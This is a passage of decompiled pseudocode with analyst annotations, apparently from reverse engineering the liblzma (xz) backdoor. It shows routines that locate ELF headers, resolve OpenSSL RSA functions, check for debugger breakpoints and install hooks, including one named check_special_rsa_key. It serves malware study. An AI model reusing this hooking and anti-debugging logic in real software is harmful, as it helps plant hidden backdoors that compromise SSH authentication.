  unsigned int *v10; // rax
  __int64 v11; // rdx
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rcx
  __int64 v16; // rax
  unsigned int *v17; // rax
  _QWORD *v18; // rdi
  __int64 v19; // rdx
  __int64 v20; // rsi
  __int64 v21; // rax
  __int64 v22; // rcx
  _DWORD *v23; // rdi
  __int64 *v24; // rdx
  __int64 v25; // rax
  __int64 v27; // rsi
  __int64 v28; // rax
  __int64 v29; // rdx
  unsigned int *v30; // [rsp+8h] [rbp-30h]

  if ( !(unsigned int)Llzma_index_iter_rewind_cold(0LL, 10LL, 0LL, 0LL) )
    return 0LL;
  lzma_allocator = get_lzma_allocator(1LL);
  v9 = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 32LL);
  *(_QWORD *)(lzma_allocator + 16) = v9;
  v10 = import_lookup_get_str(v9, 1760, 0);
  v11 = *(_QWORD *)(a1 + 8);
  if ( !*(_DWORD *)(*(_QWORD *)(v11 + 24) + 76LL) )
    goto LABEL_27;
  if ( v10 )
  {
    v12 = **(_QWORD **)(v11 + 32) + *((_QWORD *)v10 + 1);
    ++*(_DWORD *)(a4 + 288);
    *(_QWORD *)(a4 + 64) = v12;
  }
  v13 = lzma_alloc(1784LL, lzma_allocator);
  *(_QWORD *)(a4 + 152) = v13;
  if ( v13 )
    ++*(_DWORD *)(a4 + 288);
  v30 = import_lookup_get_str(*(_QWORD *)(*(_QWORD *)(a1 + 8) + 32LL), 616, 0);
  v14 = lzma_alloc(2024LL, lzma_allocator);
  *(_QWORD *)(a4 + 80) = v14;
  if ( v14 )
    ++*(_DWORD *)(a4 + 288);
  v15 = *(_QWORD *)(a1 + 8);
  if ( v30 )
  {
    v16 = **(_QWORD **)(v15 + 32) + *((_QWORD *)v30 + 1);
    ++*(_DWORD *)(a4 + 288);
    *(_QWORD *)(a4 + 72) = v16;
  }
  v17 = import_lookup_get_str(*(_QWORD *)(v15 + 8), 2504, 0);
  if ( !v17 )
    goto LABEL_27;
  v18 = *(_QWORD **)(*(_QWORD *)(a1 + 8) + 8LL);
  v19 = *((_QWORD *)v17 + 2);
  v20 = *v18 + *((_QWORD *)v17 + 1);
  a3[33] = v19;
  a3[32] = v20;
  if ( !(unsigned int)process_elf_seg((__int64)v18, v20, v19, 4LL) || !(unsigned int)resolve_imports(a1, a2, a3, a4) )
    goto LABEL_27;
  v21 = lzma_alloc(2856LL, lzma_allocator);
  *(_QWORD *)(a4 + 192) = v21;
  if ( v21 )
    ++*(_DWORD *)(a4 + 288);
  if ( !(unsigned int)Llzma_filter_flags_decode_0(
                        *(_QWORD **)(*(_QWORD *)(a1 + 8) + 8LL),
                        *(_QWORD **)(*(_QWORD *)(a1 + 8) + 32LL),
                        a3,
                        a4) )
    goto LABEL_27;
  if ( !(unsigned int)Llzma_index_hash_init_part_0(a1, *a2, a3, a4) )
    goto LABEL_27;
  v22 = 16LL;
  v23 = a3;
  while ( v22 )
  {
    *v23++ = 0;
    --v22;
  }
  v24 = (__int64 *)a3[31];
  v25 = *((unsigned int *)v24 + 2);
  if ( (unsigned int)v25 > 8 )
  {
LABEL_27:
    lzma_free(*(_QWORD *)(a4 + 152), lzma_allocator);
    lzma_free(*(_QWORD *)(a4 + 80), lzma_allocator);
    lzma_free(*(_QWORD *)(a4 + 192), lzma_allocator);
    return 0LL;
  }
  if ( (_DWORD)v25 )
  {
    v27 = *v24;
    v28 = 8 * v25;
    v29 = 0LL;
    do
    {
      *((_BYTE *)a3 + v29) = *(_BYTE *)(v27 + v29);
      ++v29;
    }
    while ( v28 != v29 );
  }
  return 1LL;
}
// 4050: using guessed type __int64 __fastcall get_lzma_allocator(_QWORD);
// 4070: using guessed type __int64 __fastcall Llzma_delta_props_encode_part_0(_QWORD, _QWORD, _QWORD, _QWORD);
// 4ED0: using guessed type __int64 __fastcall Llzma_index_hash_init_part_0(_QWORD, _QWORD, _QWORD, _QWORD);
// ABF0: using guessed type __int64 __fastcall Llzma_index_iter_rewind_cold(_QWORD, _QWORD, _QWORD, _QWORD);
// CB78: using guessed type __int64 __fastcall lzma_free(_QWORD, _QWORD);
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);

//----- (0000000000005400) ----------------------------------------------------
__int64 __fastcall install_entries(__int64 *a1, struct_elf_info *a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v7; // rcx
  __int64 *v8; // rdi
  lzma_allocator *lzma_allocator; // rax
  __int64 v10; // rax
  char *str; // r15
  unsigned __int64 v12; // r14
  unsigned __int8 *v13; // rax
  __int64 v14; // rax
  _DWORD *v15; // r13
  int v16; // eax
  int v17; // r15d
  int v18; // r14d
  __int64 v19; // rax
  __int64 v20; // r13
  unsigned int v22; // r13d
  unsigned int v23; // eax
  lzma_allocator *v25; // [rsp+8h] [rbp-E0h]
  unsigned __int64 v27; // [rsp+18h] [rbp-D0h]
  unsigned __int64 v28; // [rsp+20h] [rbp-C8h]
  unsigned __int64 v29; // [rsp+28h] [rbp-C0h]
  unsigned __int64 v30; // [rsp+30h] [rbp-B8h] BYREF
  unsigned __int64 v31; // [rsp+38h] [rbp-B0h] BYREF
  _DWORD *v32; // [rsp+40h] [rbp-A8h] BYREF
  unsigned __int64 v33; // [rsp+48h] [rbp-A0h] BYREF
  __int64 v34; // [rsp+50h] [rbp-98h] BYREF
  __int64 v35; // [rsp+58h] [rbp-90h] BYREF
  __int64 v36[17]; // [rsp+60h] [rbp-88h] BYREF

  if ( !apply_one_entry_ex(0LL, 0x1C8u, 0, 0x1Du) )
    return 0LL;
  v36[0] = (__int64)installed_func_0;
  v36[1] = 0x1C000001C8LL;
  v36[3] = (__int64)check_special_rsa_key;
  v36[2] = 0x100000000LL;
  v36[5] = 0x100000000LL;
  v36[8] = 0x100000000LL;
  v36[6] = (__int64)installed_func_2;
  v36[9] = (__int64)installed_func_3;
  v36[10] = 0x19000001C4LL;
  v36[4] = 0x1B000001C8LL;
  v36[7] = 0x1A000001C8LL;
  v36[11] = 0x100000004LL;
  if ( !(unsigned int)apply_entries(
                        (__int64)v36,
                        4uLL,
                        (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD))apply_one_entry) )
    return 0LL;
  v7 = 24LL;
  v8 = v36;
  while ( v7 )
  {
    *(_DWORD *)v8 = 0;
    v8 = (__int64 *)((char *)v8 + 4);
    --v7;
  }
  v30 = 0LL;
  v31 = 0LL;
  v32 = 0LL;
  v33 = 0LL;
  v34 = 0LL;
  v35 = 0LL;
  lzma_allocator = get_lzma_allocator(1LL);
  lzma_allocator->elf_info = a2;
  v25 = lzma_allocator;
  v10 = lzma_alloc(280LL, lzma_allocator);
  *(_QWORD *)(a4 + 128) = v10;
  if ( v10 )
    ++*(_DWORD *)(a4 + 288);
  v27 = Llzma_check_update_0((__int64)a1, &v30);
  if ( !v27 )
    return 0LL;
  v28 = v30;
  str = import_lookup_get_str(a2, 0x408, 0);
  if ( !import_lookup_get_str(a2, 0x188, 0) )
    return 0LL;
  v12 = maybe_find_freespaces(a1, &v31, 0);
  if ( !v12 )
    return 0LL;
  v29 = v31;
  if ( str )
  {
    v13 = &a2->elf_hdr->e_ident[*((_QWORD *)str + 1)];
    ++*(_DWORD *)(a4 + 288);
    *(_QWORD *)(a4 + 136) = v13;
  }
  v14 = lzma_alloc(2104LL, v25);
  *(_QWORD *)(a4 + 160) = v14;
  if ( v14 )
    ++*(_DWORD *)(a4 + 288);
  if ( !(unsigned int)sub_2540(&v32, (__int64)a1, a2, a4) )
    return 0LL;
  v15 = v32;
  *(_QWORD *)(a5 + 120) = v32;
  v16 = check_software_breakpoint(v15, (__int64)(v15 + 1), 57904);
  *(_DWORD *)a5 = v16 != 0;
  if ( v16 )
  {
    if ( !(unsigned int)apply_method_1(v15, 0LL, &v33, v15, v28 + v27, 1) )
      return 0LL;
  }
  else
  {
    v33 = v28 + v27;
  }
  v17 = Llzma_buf_cpy_0(v12, v12 + v29, v15, v33, a3, &v35, a1, a5);
  v18 = sub_3330(v12, v12 + v29, v15, v33, &v34, a1);
  v19 = lzma_alloc(3112LL, v25);
  *(_QWORD *)(a4 + 200) = v19;
  if ( v19 )
    ++*(_DWORD *)(a4 + 288);
  if ( !v17 )
  {
    if ( !v18 )
    {
LABEL_36:
      lzma_free(*(_QWORD *)(a4 + 128), v25);
      lzma_free(*(_QWORD *)(a4 + 160), v25);
      lzma_free(*(_QWORD *)(a4 + 200), v25);
      return 0LL;
    }
    v22 = 0;
    goto LABEL_31;
  }
  if ( !v18 )
  {
    v22 = Llzma_lzma2_encoder_memusage_0(v35, a1, a3, a5);
    v23 = 0;
    goto LABEL_32;
  }
  v20 = v35;
  if ( v35 != v34 )
  {
    v22 = Llzma_lzma2_encoder_memusage_0(v35, a1, a3, a5);
LABEL_31:
    v23 = Llzma_lzma2_encoder_memusage_0(v34, a1, a3, a5);
LABEL_32:
    if ( v22 >= v23 && v22 > 7 )
    {
      v20 = v35;
      goto LABEL_26;
    }
    if ( v23 >= v22 && v23 > 7 )
    {
      v20 = v34;
      goto LABEL_26;
    }
    goto LABEL_36;
  }
  if ( (unsigned int)Llzma_lzma2_encoder_memusage_0(v35, a1, a3, a5) > 7 )
  {
LABEL_26:
    *(_QWORD *)(a5 + 40) = v20;
    return 1LL;
  }
  return 0LL;
}
// 5757: conditional instruction was optimized away because r15d.4!=0
// 578B: conditional instruction was optimized away because r14d.4==0
// 3330: using guessed type __int64 __fastcall sub_3330(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 3670: using guessed type __int64 __fastcall Llzma_buf_cpy_0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 3D40: using guessed type __int64 __fastcall Llzma_lzma2_encoder_memusage_0(_QWORD, _QWORD, _QWORD, _QWORD);
// 7BF0: using guessed type __int64 __fastcall Lindex_decode_1(_QWORD, _QWORD, _QWORD);
// 7C90: using guessed type __int64 __fastcall Lindex_encode_1(_QWORD, _QWORD, _QWORD, _QWORD);
// CB78: using guessed type __int64 __fastcall lzma_free(_QWORD, _QWORD);
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);

//----- (0000000000005820) ----------------------------------------------------
__int64 __fastcall parse_elf_init(struc_init22 *init)
{
  __int64 v2; // rcx
  struc_parse_elf *p_parser_1; // rdi
  rootkit_ctx *rookit_ctx; // rcx
  rootkit_ctx *rookit_ctx_rcx; // rcx
  __int64 cpuid_got_ptr_low; // rax
  __int64 runtime_offset; // rdx
  unsigned __int64 v8; // rbx
  unsigned __int64 cpuiid_got_ptr; // rax
  __int64 v10; // rdx
  Elf64_Ehdr *elf_ehdr; // rbx
  Elf64_Ehdr *v12; // r12
  rootkit_ctx *v13; // rax
  lzma_allocator *lzma_allocator; // rax
  __int64 v15; // rdx
  __int64 cpuid_got_ptr; // rax
  __int64 v17; // rax
  __int64 v18; // rdx
  __int64 v19; // rax
  bool i; // zf
  __int64 v21; // rcx
  __int64 v22; // rsi
  struc_parse_elf *v23; // rdi
  rootkit_ctx *ctx; // rdi
  __int64 v35; // rcx
  __int64 global_counter_deref; // r13
  _DWORD *v37; // rdi
  __int64 v38; // rbx
  __int64 v39; // rax
  __int64 *v40; // rax
  __int64 v41; // rax
  __int64 v42; // rcx
  unsigned __int64 v43; // rax
  __int64 v44; // rcx
  _DWORD *v45; // rdi
  _DWORD *v46; // rdi
  __int64 v47; // rax
  __int64 v48; // rcx
  __int64 v49; // rax
  __int64 cpu_id; // rcx
  __int64 j; // rcx
  _DWORD *v52; // rdi
  __int64 v53; // rax
  __int64 v54; // rcx
  __int64 v55; // rax
  __int64 v56; // rcx
  _DWORD *v57; // rdi
  __int64 k; // rcx
  __int64 m; // rax
  __int64 v60; // rax
  __int64 v61; // rax
  lzma_allocator *v62; // rax
  struct_elf_info *str; // rbx
  __int64 v64; // rax
  unsigned __int64 v65; // r14
  unsigned __int64 v66; // r12
  __int64 freespaces; // rax
  unsigned __int64 v68; // rdx
  struc_Lencoder *Lencoder_1_addr; // rax
  char *v70; // r14
  __int64 v71; // rax
  __int64 v72; // rax
  __int64 v73; // rax
  char *v74; // r12
  unsigned int *v75; // rax
  char *v76; // rax
  struct_elf_info *v77; // rdi
  unsigned __int8 *v78; // rax
  __int64 v79; // rax
  char *v80; // r9
  unsigned __int8 *v81; // rax
  struct_elf_info *v82; // rdi
  unsigned __int8 *v83; // rax
  unsigned __int8 *v84; // rax
  unsigned __int8 *v85; // rax
  unsigned __int8 *v86; // rax
  char *v87; // rax
  __int64 v88; // r14
  struct_elf_info *v89; // rax
  __int64 v90; // rax
  __int64 v91; // rax
  _QWORD *v92; // rax
  __int64 v93; // r12
  __int64 v94; // rax
  int v95; // ebx
  __int64 v96; // rdx
  unsigned __int64 updated; // r8
  __int64 v98; // rsi
  struct_elf_info *v99; // rdi
  __int64 v100; // rax
  __int64 *v101; // r12
  int v102; // ebx
  __int64 v103; // r8
  __int64 v104; // rbx
  __int64 v105; // r12
  int v106; // r14d
  _OWORD *v107; // rax
  __int64 v108; // rdi
  __int64 v109; // r12
  unsigned __int64 v110; // r14
  _DWORD *v111; // rbx
  __int64 v112; // rcx
  __int64 *v113; // rdi
  unsigned __int64 v114; // rbx
  unsigned __int64 v115; // r14
  unsigned __int64 v116; // rbx
  char v117; // al
  char v118; // al
  char v119; // r10
  unsigned __int64 *v120; // rdi
  char v121; // r9
  __int64 v122; // rcx
  unsigned __int64 ii; // rdi
  int v124; // eax
  char v125; // al
  __int64 v126; // rcx
  unsigned __int64 v127; // rax
  unsigned __int64 v128; // rcx
  int v129; // eax
  unsigned __int64 v130; // rax
  unsigned __int64 *v131; // rdi
  __int64 n; // rcx
  unsigned __int64 v133; // rdi
  unsigned __int64 v134; // rax
  __int64 v135; // rax
  __int64 v136; // rax
  struct_elf_info *v137; // rdx
  unsigned __int8 *v138; // rax
  unsigned __int8 *v139; // rax
  __int64 v140; // rdx
  __int64 v141; // rax
  int *v142; // rdx
  int v143; // ecx
  _DWORD *v144; // rax
  __int64 v145; // rcx
  _DWORD *v146; // rdi
  __int64 v147; // rdx
  __int64 v148; // rax
  bool jj; // zf
  __int64 v150; // rcx
  struc_parse_elf *v151; // rdi
  __int64 v152; // rax
  __int64 v153; // rax
  __int64 v154; // rax
  struct_elf_info *v156; // [rsp+0h] [rbp-B58h]
  __int64 (__fastcall *import_lookup_ex)(struct_elf_info *, __int64); // [rsp+0h] [rbp-B58h]
  char *v158; // [rsp+0h] [rbp-B58h]
  __int64 *v159; // [rsp+0h] [rbp-B58h]
  int v160; // [rsp+0h] [rbp-B58h]
  unsigned __int64 v161; // [rsp+0h] [rbp-B58h]
  _DWORD *v162; // [rsp+8h] [rbp-B50h]
  char *v163; // [rsp+10h] [rbp-B48h]
  __int64 v164; // [rsp+10h] [rbp-B48h]
  __int64 v165; // [rsp+10h] [rbp-B48h]
  unsigned __int64 v166; // [rsp+10h] [rbp-B48h]
  struc_2880 *v167; // [rsp+18h] [rbp-B40h]
  lzma_allocator *v168; // [rsp+20h] [rbp-B38h]
  struc_Lencoder *v169; // [rsp+28h] [rbp-B30h]
  __int64 v170; // [rsp+30h] [rbp-B28h]
  __int64 v171; // [rsp+30h] [rbp-B28h]
  unsigned __int64 v172; // [rsp+30h] [rbp-B28h]
  lzma_allocator *v173; // [rsp+38h] [rbp-B20h]
  unsigned __int64 v174; // [rsp+38h] [rbp-B20h]
  unsigned int v175; // [rsp+38h] [rbp-B20h]
  __int64 v176; // [rsp+48h] [rbp-B10h]
  char *v177; // [rsp+50h] [rbp-B08h]
  __int64 v178; // [rsp+58h] [rbp-B00h]
  char *v179; // [rsp+58h] [rbp-B00h]
  __int64 v180; // [rsp+60h] [rbp-AF8h]
  unsigned __int64 v181; // [rsp+60h] [rbp-AF8h]
  unsigned __int64 v182; // [rsp+70h] [rbp-AE8h]
  char v183; // [rsp+70h] [rbp-AE8h]
  unsigned __int64 v184; // [rsp+70h] [rbp-AE8h]
  char v185; // [rsp+7Eh] [rbp-ADAh]
  char v186; // [rsp+7Eh] [rbp-ADAh]
  char v187; // [rsp+7Fh] [rbp-AD9h]
  int v188; // [rsp+8Ch] [rbp-ACCh] BYREF
  __int64 v189; // [rsp+90h] [rbp-AC8h] BYREF
  __int64 v190; // [rsp+98h] [rbp-AC0h] BYREF
  __int64 v191; // [rsp+A0h] [rbp-AB8h] BYREF
  __int64 v192; // [rsp+A8h] [rbp-AB0h] BYREF
  __int64 v193; // [rsp+B0h] [rbp-AA8h] BYREF
  unsigned __int64 v194; // [rsp+B8h] [rbp-AA0h] BYREF
  unsigned __int64 v195; // [rsp+C0h] [rbp-A98h] BYREF
  unsigned __int64 v196; // [rsp+C8h] [rbp-A90h] BYREF
  elf_parse_result elf_result; // [rsp+D0h] [rbp-A88h] BYREF
  __int64 v198; // [rsp+130h] [rbp-A28h]
  __int16 v199; // [rsp+138h] [rbp-A20h]
  char v200; // [rsp+143h] [rbp-A15h]
  int v201; // [rsp+144h] [rbp-A14h]
  char v202; // [rsp+148h] [rbp-A10h]
  int v203; // [rsp+150h] [rbp-A08h]
  __int64 v204; // [rsp+158h] [rbp-A00h]
  unsigned __int64 v205; // [rsp+168h] [rbp-9F0h]
  unsigned __int64 v206; // [rsp+180h] [rbp-9D8h] BYREF
  __int64 v207; // [rsp+188h] [rbp-9D0h] BYREF
  __int16 v208; // [rsp+190h] [rbp-9C8h]
  char v209; // [rsp+19Bh] [rbp-9BDh]
  int v210; // [rsp+19Ch] [rbp-9BCh]
  char v211; // [rsp+1A0h] [rbp-9B8h]
  unsigned __int64 v212; // [rsp+1B0h] [rbp-9A8h]
  __int64 v213; // [rsp+1C0h] [rbp-998h]
  struc_parse_elf parser_1; // [rsp+1D8h] [rbp-980h] BYREF
  _BYTE v215[112]; // [rsp+740h] [rbp-418h] BYREF
  _OWORD v216[36]; // [rsp+7B0h] [rbp-3A8h] BYREF
  __int64 v217; // [rsp+9F8h] [rbp-160h]
  __int64 v218; // [rsp+A00h] [rbp-158h]
  _DWORD *v219; // [rsp+AD8h] [rbp-80h]
  unsigned __int64 v220; // [rsp+AF8h] [rbp-60h]
  unsigned __int64 v221; // [rsp+B00h] [rbp-58h]
  lzma_allocator local_allocor; // [rsp+B10h] [rbp-48h]
  lzma_allocator *glo_allocator; // [rsp+B28h] [rbp-30h]

  v2 = 0x256LL;
  p_parser_1 = &parser_1;
  v188 = 0;
  while ( v2 )
  {
    LODWORD(p_parser_1->ehdr) = 0;
    p_parser_1 = (struc_parse_elf *)((char *)p_parser_1 + 4);
    --v2;
  }                                             // memset a big array
  rookit_ctx = init->rookit_ctx;
  parser_1.elf_info_arr[0] = parser_1.elf_infos;
  parser_1.elf_info_arr[1] = &parser_1.elf_infos[1];
  parser_1.elf_info_arr[2] = &parser_1.elf_infos[2];
  v189 = 0LL;
  v190 = 0LL;
  v191 = 0LL;
  v192 = 0LL;
  v193 = 0LL;
  parser_1.elf_info_arr[3] = &parser_1.elf_infos[3];
  parser_1.elf_info_arr[4] = &parser_1.elf_infos[4];
  parser_1.self_addr = &parser_1;
  parser_1.elf_arrptr = parser_1.elf_info_arr;
  get_ehdr_address(rookit_ctx);
  cpuid_got_ptr_low = LOBYTE(rookit_ctx_rcx->cpuid_got_ptr);
  runtime_offset = rookit_ctx_rcx->runtime_offset;
  rookit_ctx_rcx->cpu_id_got = cpuid_got_ptr_low;
  v8 = *(_QWORD *)(runtime_offset + 8 * cpuid_got_ptr_low + 24);
  cpuiid_got_ptr = rookit_ctx_rcx->got_ptr;
  v10 = cpuiid_got_ptr - v8;
  if ( v8 >= cpuiid_got_ptr )
    v10 = v8 - cpuiid_got_ptr;
  if ( v10 > 0x50000 )
    goto label_fail;
  elf_ehdr = (Elf64_Ehdr *)(v8 & 0xFFFFFFFFFFFFF000LL);
  v12 = elf_ehdr - 2048;
  while ( (unsigned int)table_get((char *)elf_ehdr, 0LL) != x7fELF )// find elf_ehdr
  {
    elf_ehdr -= 64;
    if ( elf_ehdr == v12 )
      goto label_fail;
  }
  elf_result.elf_info_arr = parser_1.elf_info_arr;
  elf_result.argv0 = (char **)&v193;
  v13 = init->rookit_ctx;
  elf_result.elf_ehdr = elf_ehdr;
  elf_result.cpuid_got_ptr = v13->got_ptr;
  if ( !(unsigned int)parse_elf_invoke(&elf_result) )// get the argv[0], and find free spaces
    goto label_fail;
  lzma_allocator = get_lzma_allocator(1LL);
  v15 = 0LL;
  glo_allocator = lzma_allocator;
  do
  {
    *((_BYTE *)&local_allocor.alloc + v15) = *((_BYTE *)&lzma_allocator->alloc + v15);
    ++v15;
  }
  while ( v15 != 24 );                          // copy 3qword to &v214.295
  elf_result.libs.parser = &parser_1;
  elf_result.libs.RSA_public_decrypt = &v190;
  elf_result.libs.EVP_PKEY_set1_RSA = &v191;
  elf_result.libs.RSA_get0_key = &v192;
  cpuid_got_ptr = init->cpuid_got_ptr;
  elf_result.libs.infos = parser_1.elf_info_arr;
  v17 = *(_QWORD *)(cpuid_got_ptr + 0x38);      // it's global_counter defined just in this file
  elf_result.libs.field_30 = (__int64)v215;
  elf_result.libs.global_counter = v17;
  if ( !(unsigned int)process_shared_libraries(&elf_result.libs) )
  {
label_fail:
    v176 = 0LL;
LABEL_16:
    sub_2760(v176);
    v18 = (__int64)glo_allocator;
    v19 = 0LL;
    for ( i = glo_allocator == 0LL; !i; i = v19 == 24 )
    {
      *(_BYTE *)(v18 + v19) = *((_BYTE *)&local_allocor.alloc + v19);
      ++v19;
    }
    v21 = 598LL;
    v22 = 0LL;
    v23 = &parser_1;
    while ( v21 )
    {
      LODWORD(v23->ehdr) = 0;
      v23 = (struc_parse_elf *)((char *)v23 + 4);
      --v21;
    }
    ctx = init->rookit_ctx;
    goto label_exit;
  }
  v35 = 90LL;                                   // success continues here, 0x7ffff7fa8d38
  global_counter_deref = **(_QWORD **)(init->cpuid_got_ptr + 0x38);// cpuid_got_ptr(0x7fffffffe730) is changed to 0x00007fffffffe698
                                                // by RIP:0x7ffff7fa802e
  v176 = global_counter_deref;                  // 0x00007ffff7fc2038
  v162 = (_DWORD *)(global_counter_deref + 312);
  v37 = (_DWORD *)(global_counter_deref + 312);
  v38 = global_counter_deref + 1192;
  v167 = (struc_2880 *)(global_counter_deref + 672);
  while ( v35 )
  {
    *v37++ = 0;
    --v35;
  }
  *(_QWORD *)(global_counter_deref + 0x168) = global_counter_deref + 0x518;
  v39 = init->cpuid_got_ptr;
  *(_QWORD *)(global_counter_deref + 0x140) = v167;
  *(_QWORD *)(global_counter_deref + 0x158) = global_counter_deref + 968;
  v40 = *(__int64 **)(v39 + 56);
  *(_QWORD *)(global_counter_deref + 328) = v38;
  v41 = *v40;
  v42 = *(_QWORD *)(v41 + 1408);
  *(_QWORD *)(global_counter_deref + 544) = 0LL;
  *(_QWORD *)(global_counter_deref + 552) = v41 + 1416;
  *(_QWORD *)(global_counter_deref + 536) = v42;
  sub_2D20((__int64)parser_1.elf_infos, (__int64)v216);
  v194 = 0LL;
  v43 = Llzma_check_update_0((__int64)parser_1.elf_info_arr[3], &v194);
  if ( !v43 )
    goto LABEL_16;
  *(_QWORD *)(global_counter_deref + 440) = v43;
  v44 = 78LL;
  v45 = (_DWORD *)global_counter_deref;
  *(_QWORD *)(global_counter_deref + 448) = v194 + v43;
  while ( v44 )
  {
    *v45++ = 0;
    --v44;
  }
  v46 = (_DWORD *)(global_counter_deref + 968);
  *(_QWORD *)(global_counter_deref + 296) = v167;
  v47 = init->cpuid_got_ptr;
  v48 = *(_QWORD *)(v47 + 72);
  v49 = *(_QWORD *)(v47 + 80);
  *(_QWORD *)(global_counter_deref + 272) = v48;
  cpu_id = init->static_gots->cpu_id;
  *(_QWORD *)(global_counter_deref + 288) = v49;
  *(_QWORD *)(global_counter_deref + 280) = cpu_id;
  for ( j = 56LL; j; --j )
    *v46++ = 0;
  v52 = (_DWORD *)(global_counter_deref + 0x518);
  *(_QWORD *)(global_counter_deref + 984) = init->static_gots->field_0;
  v53 = init->cpuid_got_ptr;
  v54 = *(_QWORD *)(v53 + 112);
  v55 = *(_QWORD *)(v53 + 120);
  *(_QWORD *)(global_counter_deref + 992) = v54;
  v56 = 26LL;
  *(_QWORD *)(global_counter_deref + 1000) = v55;
  while ( v56 )
  {
    *v52++ = 0;
    --v56;
  }
  v57 = (_DWORD *)(global_counter_deref + 672);
  *(_QWORD *)(global_counter_deref + 1400) = *(_QWORD *)(init->cpuid_got_ptr + 88);
  *(_QWORD *)init->static_gots->backdoor_init_stage2 = v162;
  for ( k = 74LL; k; --k )
    *v57++ = 0;
  *(_QWORD *)(global_counter_deref + 696) = v190;
  *(_QWORD *)(global_counter_deref + 704) = v191;
  *(_QWORD *)(global_counter_deref + 712) = v192;
  for ( m = 0LL; m != 112; ++m )
    *(_BYTE *)(global_counter_deref + m + 1192) = v215[m];
  v60 = v193;
  *(_QWORD *)(global_counter_deref + 952) = v38;
  *(_QWORD *)(global_counter_deref + 1296) = v60;
  v173 = get_lzma_allocator(1LL);
  v173->elf_info = parser_1.elf_info_arr[2];
  v61 = lzma_alloc(0x440LL, v173);
  *(_QWORD *)(global_counter_deref + 1200) = v61;
  if ( v61 )
    ++*(_DWORD *)(global_counter_deref + 1192);
  if ( !(unsigned int)Llzma_lz_decoder_init_0(
                        (__int64)&parser_1.self_addr,
                        &v189,
                        (_QWORD *)global_counter_deref,
                        (__int64)v167) )
    goto LABEL_16;
  v62 = get_lzma_allocator(1LL);
  str = parser_1.elf_info_arr[4];
  v168 = v62;
  v62->elf_info = parser_1.elf_info_arr[4];
  if ( str )
  {
    str = (struct_elf_info *)import_lookup_get_str(str, 0x798, 0);
    v64 = lzma_alloc(0xAF8LL, v168);
    *(_QWORD *)(global_counter_deref + 792) = v64;
    if ( v64 )
      ++*(_DWORD *)(global_counter_deref + 960);
  }
  elf_result.field_58 = 0LL;
  v206 = 0LL;
  v156 = parser_1.elf_info_arr[0];
  v65 = Llzma_check_update_0((__int64)parser_1.elf_info_arr[0], (unsigned __int64 *)&elf_result.field_58);
  v66 = v65 + elf_result.field_58;
  freespaces = maybe_find_freespaces(v156, &v206, 0);
  v68 = v206;
  *(_QWORD *)(global_counter_deref + 400) = v65;
  *(_QWORD *)(global_counter_deref + 408) = v66;
  *(_QWORD *)(global_counter_deref + 416) = freespaces;
  *(_QWORD *)(global_counter_deref + 424) = freespaces + v68;
  Lencoder_1_addr = get__Lencoder_1_addr();
  v169 = Lencoder_1_addr;
  if ( !Lencoder_1_addr )
    goto LABEL_16;
  import_lookup_ex = (__int64 (__fastcall *)(struct_elf_info *, __int64))Lencoder_1_addr->import_lookup_ex;
  if ( !import_lookup_ex || !Lencoder_1_addr->parse_elf )
    goto LABEL_16;
  v70 = 0LL;
  v71 = import_lookup_ex(parser_1.elf_info_arr[4], 1048LL);
  *(_QWORD *)(global_counter_deref + 944) = v71;
  if ( v71 )
    v70 = import_lookup_get_str(parser_1.elf_info_arr[4], BN_bin2bn, 0);
  v188 = 712;
  v72 = Llzip_decode_0(parser_1.elf_info_arr[0], &v188, 0LL);
  *(_QWORD *)(global_counter_deref + 368) = v72;
  if ( !v72 )
    goto LABEL_16;
  v188 = 1808;
  v73 = Llzip_decode_0(parser_1.elf_info_arr[0], &v188, 0LL);
  *(_QWORD *)(global_counter_deref + 376) = v73;
  if ( !v73 )
    goto LABEL_16;
  v74 = 0LL;
  v75 = ::import_lookup_ex(parser_1.elf_info_arr[4], 1744);
  *(_QWORD *)(global_counter_deref + 928) = v75;
  if ( v75 )
  {
    v76 = import_lookup_get_str(parser_1.elf_info_arr[4], 0x958, 0);
    v77 = parser_1.elf_info_arr[4];
    if ( v76 )
    {
      v78 = &parser_1.elf_info_arr[4]->elf_hdr->e_ident[*((_QWORD *)v76 + 1)];
      ++*(_DWORD *)(global_counter_deref + 960);
      *(_QWORD *)(global_counter_deref + 888) = v78;
    }
    v74 = import_lookup_get_str(v77, 2328, 0);
    if ( *(_QWORD *)(global_counter_deref + 944) )
      ++*(_DWORD *)(global_counter_deref + 960);
  }
  v163 = import_lookup_get_str(parser_1.elf_info_arr[4], 0xAC0, 0);
  v79 = import_lookup_ex(parser_1.elf_info_arr[4], 1344LL);
  v80 = 0LL;
  *(_QWORD *)(global_counter_deref + 904) = v79;
  if ( v79 )
  {
    ++*(_DWORD *)(global_counter_deref + 960);
    v80 = import_lookup_get_str(parser_1.elf_info_arr[4], 2296, 0);
    if ( str )
    {
      v81 = &parser_1.elf_info_arr[4]->elf_hdr->e_ident[str->last_va];
      ++*(_DWORD *)(global_counter_deref + 960);
      *(_QWORD *)(global_counter_deref + 768) = v81;
    }
  }
  if ( *(_QWORD *)(global_counter_deref + 928) )
    ++*(_DWORD *)(global_counter_deref + 960);
  v158 = v80;
  if ( !(unsigned int)install_entries(
                        (__int64 *)parser_1.elf_info_arr[0],
                        parser_1.elf_info_arr[4],
                        (__int64)v216,
                        (__int64)v167,
                        (__int64)v162) )
    goto LABEL_16;
  v82 = parser_1.elf_info_arr[4];
  if ( v70 )
  {
    v83 = &parser_1.elf_info_arr[4]->elf_hdr->e_ident[*((_QWORD *)v70 + 1)];
    ++*(_DWORD *)(global_counter_deref + 960);
    *(_QWORD *)(global_counter_deref + 896) = v83;
  }
  if ( v74 )
  {
    v84 = &v82->elf_hdr->e_ident[*((_QWORD *)v74 + 1)];
    ++*(_DWORD *)(global_counter_deref + 960);
    *(_QWORD *)(global_counter_deref + 880) = v84;
  }
  if ( v163 )
  {
    v85 = &v82->elf_hdr->e_ident[*((_QWORD *)v163 + 1)];
    ++*(_DWORD *)(global_counter_deref + 960);
